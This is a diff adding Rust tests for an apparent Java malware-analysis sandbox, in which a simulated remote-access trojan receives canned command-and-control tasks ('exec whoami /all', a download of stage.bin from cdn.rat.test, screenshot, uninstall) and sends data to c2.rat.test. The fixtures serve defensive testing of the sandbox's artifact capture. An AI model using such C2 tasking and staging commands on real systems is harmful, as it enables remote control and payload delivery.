@@ -201,3 +201,93 @@ fn the_command_line_is_the_same_analysis() {
     assert_eq!(from_file["environment"]["properties"]["java.version"], "17");
     assert_eq!(from_file["environment"]["userName"], "o'brien");
 }
+
+/// The HTTP fixture's full scenario (from the Java corpus tests): canned answers make it download
+/// a file and send results back, so the run saves files.
+fn http_rat_settings(sample: &str) -> String {
+    config::render_document(&serde_json::json!({
+        "sample": sample,
+        "entryPoints": [{"type": "main", "class": "dev.javabyte.guest.sim.HttpRat"}],
+        "network": {"http": [
+            {"url": "/task\\?id=\\w+&n=1$", "body": "exec whoami /all"},
+            {"url": "/task\\?id=\\w+&n=2$", "body": "download http://cdn.rat.test/stage.bin C:\\Users\\Public\\stage.bin"},
+            {"url": "/task\\?id=\\w+&n=3$", "body": "screenshot"},
+            {"url": "/task\\?id=\\w+&n=4$", "body": "uninstall"},
+            {"url": "cdn\\.rat\\.test/stage\\.bin", "bodyBase64": "TVqQAAMAAAAEAAAA"}
+        ]},
+        "processes": [{"command": "whoami", "stdout": "desktop\\admin\n"}]
+    }))
+}
+
+#[test]
+fn saved_files_limits_comparison_and_run_again() {
+    let Some((mut session, classes)) = session("files") else { return };
+    let sample = Session::choose(&classes).unwrap();
+    session.inspect(sample.clone()).unwrap();
+
+    // First run: no answers, so the fixture waits for its server.
+    choose_entry(&mut session, &EntryChoice::MainOf { class: "dev.javabyte.guest.sim.HttpRat".into() });
+    session.start().unwrap();
+    wait_until_finished(&mut session);
+    let first = session.report().unwrap();
+    assert!(first.limits.endings.iter().any(|e| e.outcome == "sleep-budget" && e.next.as_ref().is_some_and(|n| n.setting.as_deref() == Some("network.http"))),
+        "a waiting sample is pointed at web answers: {:?}", first.limits.endings);
+
+    // Second run: with answers, it downloads a file and sends results.
+    session.set_settings_text(http_rat_settings(&sample.path));
+    session.start().unwrap();
+    wait_until_finished(&mut session);
+    let second = session.report().unwrap();
+    assert!(second.config_text.as_deref().is_some_and(|t| t.contains("cdn")), "the run's settings file is shown");
+    assert!(second.limits.refusals.iter().any(|r| r.member.starts_with("java/awt/Robot")), "{:?}", second.limits.refusals);
+
+    let files = session.artifacts().unwrap();
+    let stage = files.iter().find(|a| a.name == "stage.bin").expect("the downloaded file is listed");
+    assert_eq!(stage.kind, "dropped");
+    assert_eq!(stage.origin.as_deref(), Some("C:\\Users\\Public\\stage.bin"));
+    assert_eq!(stage.size, 12);
+    assert_eq!(stage.sha256, "d930a77b4e5a6df96f8be687f754be90fa6da7939406d214814a80393847ce1b");
+    let sent = files.iter().find(|a| a.kind == "network").expect("data it sent is listed");
+    assert!(sent.origin.as_deref().is_some_and(|u| u.starts_with("http://c2.rat.test")), "{sent:?}");
+    let page = session.artifact_page(&stage.path, 0).unwrap();
+    assert_eq!(&page.bytes[..2], b"MZ");
+    assert!(session.artifact_page("../report.json", 0).is_err(), "only the run's saved files");
+
+    // Copies: never next to the sample (the test classes folder's parent).
+    let out = std::env::temp_dir().join(format!("javabyte-files-copy-{}.zip", std::process::id()));
+    session.save_zip(&[stage.path.clone()], &out).unwrap();
+    assert!(out.is_file());
+    assert!(session.save_zip(&[stage.path.clone()], &classes.join("copy.zip")).is_err());
+
+    // Compare: the second run against the first.
+    let recent = session.recent();
+    let comparison = session.compare(&recent[1].id, &recent[0].id).unwrap();
+    assert!(comparison.same_sample);
+    assert!(comparison.settings.iter().any(|s| s.path == "network.http"), "{:?}", comparison.settings);
+    let files_written = comparison.indicators.iter().find(|i| i.id == "files").expect("files indicator");
+    assert!(files_written.added.iter().any(|f| f.contains("stage.bin")), "{files_written:?}");
+    assert!(session.compare(&recent[0].id, &recent[0].id).unwrap().identical(), "a run compared with itself");
+
+    // Run again with changes: the run's own settings come back for the same sample.
+    session.run_again().unwrap();
+    assert!(session.settings_text().unwrap().contains("cdn"), "{}", session.settings_text().unwrap());
+}
+
+#[test]
+fn reports_from_the_command_line_open_too() {
+    let Some((mut session, classes)) = session("open") else { return };
+    let jar = std::env::var_os("JAVABYTE_JAR").unwrap();
+    let folder = std::env::temp_dir().join(format!("javabyte-cli-run-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&folder);
+    let status = std::process::Command::new(std::env::var_os("JAVABYTE_JAVA").unwrap_or_else(|| "java".into()))
+        .arg("-jar").arg(&jar).arg("run").arg(&classes)
+        .args(["-s", "entryPoints=[{class: dev.javabyte.guest.Basics}]", "-s", "output.console=quiet", "-o"]).arg(&folder)
+        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null())
+        .status().unwrap();
+    assert_eq!(status.code(), Some(0));
+    let view = session.open_report_at(&folder).unwrap();
+    assert_eq!(view.runs[0].outcome, "completed");
+    assert_eq!(session.recent()[0].output_dir, folder.display().to_string(), "it joins the recent list");
+    assert!(session.open_report_at(&folder.join("report.json")).is_ok(), "the file itself works too");
+    assert!(session.open_report_at(&classes).is_err(), "a folder without a report is refused");
+}
